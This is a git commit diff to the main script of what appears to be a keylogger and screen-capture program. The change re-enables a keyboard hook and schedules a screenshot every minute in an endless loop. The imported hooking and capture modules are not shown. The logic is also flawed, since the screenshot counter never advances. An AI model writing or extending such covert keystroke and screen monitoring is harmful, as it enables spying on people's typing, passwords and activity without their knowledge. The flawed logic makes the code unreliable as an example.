9c631efd827e5e73c6abc9e894233eecbab30d55
Xendorium <akama23@wp.pl>
2024-01-03 18:40:52 +0100

    Screens

--- main.py
+++ main.py
@@ -1,13 +1,22 @@
-import time
 import Hook_Keyboard
 import PrintScreen
+import schedule
+import time
 
 
 number = 0
 
-while True:
-   #Hook_Keyboard.hook_keyboard()
+
+def wait(number):
     PrintScreen.take_screen(number)
     number = number + 1
-    time.sleep(10)
+
+
+schedule.every(1).minutes.do(wait, number)
+while True:
+    Hook_Keyboard.hook_keyboard()
+    schedule.run_pending()
+    time.sleep(1)
+
+
 
